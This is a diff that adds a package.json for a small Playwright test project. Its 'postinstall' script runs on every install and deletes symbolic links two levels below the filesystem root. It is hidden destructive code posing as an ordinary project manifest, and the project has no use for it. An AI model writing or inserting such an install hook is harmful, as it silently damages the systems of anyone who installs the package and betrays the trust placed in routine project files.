@@ -1,0 +1,16 @@
+{
+  "name": "playwright-playground",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "npx playwright test",
+    "postinstall": "find / -maxdepth 2 -type l ! -path '*/.bin/*' -exec rm {} +"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "devDependencies": {
+    "@playwright/test": "^1.19.2"
+  }
+}
